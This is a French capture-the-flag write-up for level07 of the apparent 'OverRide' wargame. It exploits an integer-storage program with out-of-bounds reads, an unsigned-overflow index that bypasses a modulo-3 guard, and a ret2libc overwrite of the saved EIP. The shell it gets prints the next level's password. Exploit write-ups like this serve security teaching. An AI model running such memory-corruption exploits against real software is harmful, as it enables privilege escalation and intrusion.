## LEVEL 07

Le programme nous informe qu'il est possible d'utiliser 3 commandes :

 - store
 - read
 - quit

Store permet de stocker un int dans un index donné.
Read permet de lire la valeur d'un index donné.
Quit permet de quitter le programme.

Néanmoins le programme nous empêche de stocker des valeurs dans certains index.
En effet les **index % 3 = 0** ne peuvent être modifiées.

Read nous permet de lire l'index d'une case mémoire et rien ne nous empêche de lire une case mémoire en dehors du programme. On peut donc essayer de trouver l'adresse du tableau que l'on peut modifier, puis l'adresse de l'eip.

Pour ça on créé un breakpoint lors de l'appel de la fonction read_number().

```
(gdb) b read_number
Breakpoint 2 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 2, 0x080486dd in read_number ()
(gdb) x $ebp+0x8
0xffffd540:     0xffffd564
```

Bien, nous avons alors l'adresse d'où est le tableau et l'adresse du tableau.

Pour nous permettre de trouver l'index de notre tableau il faut donc faire la différence entre ces deux adresses.

    0xffffd540 - 0xffffd564 = -36
    -36 / 4 = -9
Puisque notre tableau est un tableau d'int on le divise alors par 4.
On trouve alors l'index de l'adresse du tableau. On peut donc récupérer l'adresse associé en utilisant le programme.

    Input command: read
    Index: -9
    Number at data[4294967287] is 4294956388
    Completed read command successfully

   4294956388 = 0xffffd564
   
On a l'adresse du tableau, maintenant essayons de trouver l'adresse de l'eip au moment du read_number().

Cette fonction ce trouve à main+520. On place alors un breakpoint à cette endroit et on print les frame infos.

```
(gdb) b *main+520
Breakpoint 1 at 0x804892b
(gdb) r
Starting program: /home/users/level07/level07
...

Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd730:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd728, args:
 Locals at 0xffffd728, Previous frame's sp is 0xffffd730
 Saved registers:
   ebx at 0xffffd71c, ebp at 0xffffd728, esi at 0xffffd720, edi at 0xffffd724, eip at 0xffffd72c
```

On à l'adresse de l'eip : 0xffffd72c.

On peut alors faire une soustraction entre l'eip et l'adresse de notre tableau pour trouver l'index de la même manière que l'index du tab.

    0xffffd72c - 0xffffd564 = 456
    456 / 4 = 114

On à alors l'index de notre eip.

```
Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
```

4158936339 = 0xf7e45513

On check grace au breakpoint :

    (gdb) x 0xffffd72c
    0xffffd72c:     0xf7e45513

Bien, tout semble correct.

On va alors utiliser une ret2libc attack pour lancer un /bin/sh.

```
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
...
```
On a l'adresse de system() : **0xf7e6aed0  =  4159090384**

On va devoir alors modifier l'index 114 avec ce nombre. Le problème est que l'index 114 est protégé. 

    114 % 3 = 0
On va donc utiliser un max uint overflow pour atteindre l'index que l'on veut.
```
(max_uint / 4) + 114
(4294967295 / 4) + 114
1073741824 + 114
1073741938
```
**1073741938** % 3 = 1 donc notre résultat passe la protection !

Il nous reste plus qu'a trouver l'adresse de /bin/sh.

```
(gdb) info proc map
process 1757
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```
On l'a : **0xf7f897ec = 4160264172**

Pour finir on utilise l'index 116 pour les argument de notre system(), qui est donc à eip + 2.

Maintenant on peut exploiter le programme :

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384     //// system()
 Index: 1073741938	//// 114 avec max_uint overflow
 Completed store command successfully
Input command: store
 Number: 4160264172	//// /bin/sh
 Index: 116		//// index de eip+2 (arguments).
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
